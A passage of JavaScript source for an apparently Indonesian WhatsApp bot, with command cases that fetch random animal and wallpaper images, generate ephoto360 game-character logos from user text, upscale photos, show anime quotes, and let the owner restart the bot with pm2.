            }
            break
            case "poke":
            case ",n":
            case "pokemon": {
            if (isBan) return reply(mess.ban)
               m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://mfarels.my.id/api/pokemon` }, caption: `❏ *Pᴇɴᴄᴀʀɪᴀɴ :* ⟨ ${command} ⟩`}, { quoted: m } )
            }
            break
            case "cat":
            case "op":
            case "kucing": {
            if (isBan) return reply(mess.ban)
               m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://mfarels.my.id/api/kucing` }, caption: `❏ *Pᴇɴᴄᴀʀɪᴀɴ :* ⟨ ${command} ⟩`}, { quoted: m } )
            }
            break
            case "dog":
            case "xc":
            case "anjing": {
            if (isBan) return reply(mess.ban)
               m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://mfarels.my.id/api/anjing` }, caption: `❏ *Pᴇɴᴄᴀʀɪᴀɴ :* ⟨ ${command} ⟩`}, { quoted: m } )
            }
            break
            case "walpaperml":
            case "wallpaperml":
            case "walml":
            case "wallml":
            case "wml": {
            if (isBan) return reply(mess.ban)
               m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://mfarels.my.id/api/wallppml` }, caption: `⟨ *Wᴀʟʟᴘᴀᴘᴇʀ Mᴏʙɪʟᴇ Lᴇɢᴇɴᴅs* ⟩`}, { quoted: m } )
            }
            break
           break
           case "wallas":
           case "wallpaperasthetic":
           case "a":
           case "wallasthetic":
           case "asthetic": {
            if (isBan) return reply(mess.ban)
               m.reply(mess.wait)
               tganz.sendMessage(m.chat, { image: { url : `https://mfarels.my.id/api/aesthetic` }, caption: `⟨ *Wᴀʟʟᴘᴀᴘᴇʀ Asᴛʜᴇᴛɪᴄ* ⟩`}, { quoted: m } )
            }
            break
            case 'dragonballfb': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|kale`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|kale`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['cabba', 'caulifla', 'cooler', 'cumber', 'hit', 'kale', 'kaminoren', 'gokuui', 'xenogokuss3', 'xenogokuss4', 'xenovegeta', 'xenovegito', 'android-18', 'blackgoku', 'bulma', 'frieza', 'gotenks-2', 'kaio', 'krillinandroid-18', 'launch', 'nutenroshi-2', 'oldkai', 'oolong', 'pilaf', 'tienshinhan', 'trunks-3', 'bardock', 'gotenks', 'nutenroshi', 'piccolo', 'songoku-2', 'songoku-3', 'songoten', 'trunks-2', 'vegeta-2', 'vegito', 'krillin', 'najinbuu', 'songohan', 'songoku', 'trunks', 'vegeta']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'bannerofaov': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|swain`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|swain`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['aphelios', 'karma', 'leesin-2', 'nidalee-2', 'soraka-2', 'soraka-3', 'swain', 'akali-4', 'ekko-2', 'qiyana', 'senna', 'yasuo-3', 'ahri-2', 'akali-3', 'ashe-3', 'caitlyn', 'camille', 'darius', 'draven', 'evelynn-2', 'kaisa', 'kayle', 'pantheon', 'rengar', 'sivir-2', 'sona', 'vayne-3', 'wukong', 'zoe-2', 'zyra', 'azir', 'garen', 'jinx-3', 'katarina-3', 'lux-3', 'nasus', 'nidalee', 'sejuani', 'sylas', 'vayner-2', 'vi-2', 'warwick-2', 'fiora-2', 'irelia-3', 'janna-2', 'jax', 'leesin', 'nasteryi-2', 'norgana', 'nami', 'riven-2', 'riven-3', 'talon-2', 'neeko', 'neeko-2', 'xayahrakan', 'zoe', 'ahri', 'ezreal-2', 'janna', 'jinx-2', 'lulu', 'lux-2', 'nissfortune', 'poopy', 'soraka', 'syndra', 'ezreal', 'graves', 'jayce', 'katarina-2', 'lux', 'yuumi', 'aatrox', 'akali-2', 'diana', 'elise', 'evelynn', 'jhin-2', 'kalista-2', 'kennen', 'pyke-2', 'shen', 'sivir', 'talon', 'twistedfate', 'thresh-2', 'yasuo-2', 'zilean', 'ashe-2', 'kalista', 'khazix', 'riven', 'riven', 'shyvana', 'thresh', 'zed-2', 'akali', 'ashe', 'ekko', 'fiora', 'irelia', 'irelia-2', 'jhin', 'jinx', 'katarina', 'leona', 'lucian', 'nasteryi', 'pyke', 'vayne', 'vi', 'warwick', 'yasuo', 'zed']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'tohd':
            case 'remini': {
            if (isBan) return reply(mess.ban)
            if (!isMedia) return reply(`Hɪ ᴋᴀᴋ, Fᴏᴛᴏ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴛᴀᴍʙᴀʜ ʀᴇsᴏʟᴜsɪ/HD ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
            if (/webp/.test(mime)) return reply(`Hɪ ᴋᴀᴋ, Fᴏᴛᴏ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ᴛᴀᴍʙᴀʜ ʀᴇsᴏʟᴜsɪ/HD ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} ⟨ Kɪʀɪᴍ/Bᴀʟᴀs Gᴀᴍʙᴀʀɴʏᴀ ⟩*`)
            m.reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			tganz.sendMessage(m.chat, { image: proses, caption: mess.done }, { quoted: m})
			await sleep(5000) // Semakin lama waktu yang di tunggu semakin baik hasilnya !!!
			}
            break
            case 'effect3donbeach': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|beach-5`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|background\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|beach-5`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['beach-1', 'beach-2', 'beach-3', 'beach-4', 'beach-5', 'beach-6']
                if (!style.includes(m2)) {
                    getStyle(style.length, "background")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        background: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'cutegirlgamer': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style-3`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style-3`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['style-1', 'style-2', 'style-3', 'style-4', 'style-5', 'style-6', 'style-7', 'style-8', 'style-9', 'style-10', 'style-11', 'style-12']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'footballteam': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nau-5`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nau-5`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['nau-1', 'nau-2', 'nau-3', 'nau-4', 'nau-5', 'nau-6']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'beautifulshimmering': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|champion\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nina`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|champion\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nina`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['aleister', 'alice', 'butterfly', 'diaochan', 'kahlii', 'krixi', 'nina', 'nakroth', 'natalya', 'taara', 'thane', 'violet', 'zanis', 'zata', 'airi', 'annette', 'arthur', 'arum', 'astrid', 'elandorr', 'gildur', 'gildur', 'hayate', 'ilumia', 'ishar', 'lauriel', 'lindis', 'nurad', 'quillen', 'rouie', 'sephera', 'yena', 'yorn']
                if (!style.includes(m2)) {
                    getStyle(style.length, "champion")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        champion: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'pubgcutelogo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|chicken`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|chicken`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['chicken', 'soldier']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'elegantrotation': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|dragon`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|dragon`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['bull', 'dragon', 'eagle', 'lion', 'rhino', 'tiger']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'logogamingassasin': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style-1`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style-1`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['style-1', 'style-2', 'style-3', 'style-4', 'style-5', 'style-6', 'style-7', 'style-8', 'style-9', 'style-10', 'style-11', 'style-12', 'style-13', 'style-14', 'style-15', 'style-16', 'style-17', 'style-18', 'style-19', 'style-20', 'style-21', 'style-22', 'style-23', 'style-24']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'introvideomaker': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|dragon`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|dragon`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['bull', 'dragon', 'eagle', 'lion', 'tiger', 'skull']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'gaminglogo4fvs': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|soldier`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|soldier`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['girl', 'ghost', 'soldier-2', 'swat', 'woman', 'soldier', 'sniper', 'raccoon', 'rabbit', 'panda', 'chicken']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'blueneon': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lion`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lion`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['tiger', 'shark', 'dugong', 'bull', 'cheetah', 'lion']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'metalmascot': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lion`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lion`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['snakelion', 'dragon', 'ragon-2', 'eagle', 'falcon', 'fox', 'lion', 'panther', 'phoenix', 'phoenix', 'rhino', 'squirrel', 'tiger', 'unicorn', 'wolf', 'zebra']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'quotesanime': 
            case 'aoejdk': 
            case 'qotesanime': 
            case 'quotesanimeh': {
            if (isBan) return reply(mess.ban)
         		     reply(mess.wait)
         		     let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `.aoejdk`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~ Qᴜᴏᴛᴇs Aɴɪᴍᴇ ⸙\n⊙════════════════════⊙\n*◈ ${result.quotes}*\n⊙════════════════════⊙\n\n⫹⫺ Pᴇɴᴄɪᴘᴛᴀ : *'${result.karakter}', ${result.anime}*\n⫹⫺ Cᴇʀɪᴛᴀ ɪɴɪ ᴅɪ ᴘᴜʙʟɪᴋ ᴘᴀᴅᴀ :\n*☞ ${result.up_at}*`,
                    footer: '*❑ ᴋʟɪᴋ ʟᴀɴᴊᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ϙᴜᴏᴛᴇs ʟᴀɪɴɴʏᴀ*',
                    buttons: buttons,
                    headerType: 2
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'anonymous2': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style1`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|style1`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['style1', 'style2', 'style3']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/anonymous', {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'lolpentakill': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nocturne`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|nocturne`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['jhin', 'syndra', 'olaf', 'nocturne', 'chogath', 'kassadin', 'nidalee', 'fiora', 'fiddlesticks', 'garen', 'irelia-2', 'janna', 'lissandra', 'ezreal', 'riven', 'nalphite', 'khazix', 'nasteryi', 'irelia', 'alista', 'jayce', 'singed', 'galio', 'velkoz', 'yi', 'yasuo', 'sona', 'nidalee-2', 'teemo', 'leesin', 'jinx', 'zed', 'camille', 'brand', 'warwick', 'rengar', 'vayne', 'leona', 'ashe', 'ezreal', 'annie', 'xerath', 'ahri', 'kayle', 'nissfortune', 'caitlyn', 'vi', 'leesin', 'darius', 'fizz', 'bloodyasuo', 'ekko', 'lucian', 'rakanandayah']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'restart':
            case 'ulangi':
            case 'rest': {
       if (isBan) return reply(mess.ban)
       if (!isCreator) return reply(mess.owner)
      let cp = require('child_process')
      let { promisify } = require('util')
      let exec = promisify(cp.exec).bind(cp)
      let o
    try {
      o = exec('pm2 restart all')
    } catch (e) {
      o = e
    } finally {
     let { stdout, stderr } = o
     }
    }
       break
            case 'avatarleagueofking': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ilumia-5`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|ilumia-5`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['arum-6', 'baldum-3', 'elandorr-3', 'hayate-5', 'ilumia-5', 'ishar-4', 'lauriel-8', 'nax-5', 'nurad-9', 'quillen-6', 'teemee-3', 'telannas-8', 'volkath-3', 'yena-4', 'yena-5', 'butterfly-10', 'laville', 'laville-2', 'nakroth-7', 'omen-6', 'rouie-2', 'taara-4', 'zanis-8', 'zata', 'zata-2', 'elsu-6', 'fennik-5', 'liliana-7', 'paine', 'paine-2', 'rouie', 'astrid-4', 'ata', 'ata-2', 'lauriel-8', 'omen-5', 'qi-3', 'roxie-5', 'taara-5', 'violet-12', 'wukong-7', 'wukong-8', 'hayate-4', 'ishar-3', 'jinna-5', 'keera-2', 'lauriel-7', 'quillen-5', 'richter-4', 'ryoma-6', 'telannas-8', 'tulen-9', 'yorn-8', 'aleister-4', 'dirak-2', 'grakk-5', 'kerra', 'raz-5', 'amily-5', 'athur-7', 'arum-5', 'ishar-2', 'nax-4', 'natalya-6', 'natalya-7', 'zill-5', 'diaochan-6', 'ignis-4', 'lubu-8', 'naloch-7', 'sephera-4', 'elandorr', 'elandorr-2', 'krizziz-2', 'violet-11', 'yena-3', 'arduin-4', 'enzo-3', 'errol-3', 'hayate-3', 'krixi-7', 'krizziz', 'nurad-8', 'volkath', 'volkath-2', 'wisp-4', 'wukong-6', 'celica', 'gildur-4', 'ishar', 'nurad-7', 'quillen-4', 'tulen-8', 'lauriel-6', 'qi', 'qi-2', 'darcy-3', 'florentino-3', 'noren-3', 'ryoma-5', 'sephera-3', 'annette-4', 'capheny-3', 'elsu-5', 'narja', 'veres-3', 'violet-10', 'zip', 'zip-2', 'diaochan-5', 'enzo-2', 'lubu-7', 'nganga-4', 'payna-3', 'roxie-4', 'violet-9', 'zanis-7', 'zephys-6', 'enzo', 'liliana-6', 'lindis-5', 'xeniel-5', 'airi-9', 'errol-2', 'yena-2', 'zuka-8', 'notos', 'chaugnar', 'kahlii', 'lubo', 'nina', 'krixi', 'zanis-3', 'jinna', 'fennik', 'airi', 'ormarr', 'toro', 'butterfly', 'nakroth', 'gildur', 'omega', 'natalya', 'lumburr', 'yorn', 'dieu-thuyen', 'nganga', 'grankk-2', 'azzenka', 'alice', 'violet', 'violet2', 'butterfly2', 'krixi2', 'natalya2', 'taara', 'ormarr2', 'valhein', 'zephys', 'nakroth2', 'aleister', 'payna', 'wukong', 'naloch', 'kricnak', 'slimz2', 'cresht', 'slimz', 'dieu-thuyen2', 'thane-2', 'preyta', 'fennik-2', 'raz', 'preyta-2', 'payna-2', 'illumia', 'nortos-2', 'yorn-2', 'violet-3', 'valhein-2', 'taara-2', 'skud-1', 'skud', 'natalya-3', 'lu-bu', 'jinna-2', 'illumia-2', 'butterfly-4', 'batman', 'zuka-2', 'airi-2', 'zanis', 'nurad', 'nurad-2', 'nina-2', 'lauriel-2', 'ignis-2', 'ignis', 'grakk', 'airi-3', 'zill-2', 'zill', 'zanis-2', 'yorn-3', 'veera-3', 'veera-2', 'telannas', 'superman', 'naloch-2', 'krixi-3', 'butterfly-5', 'violet-5', 'veera-4', 'telannas-2', 'illumia-3', 'batman-2', 'arduin-2', 'arduin', 'wukong-2', 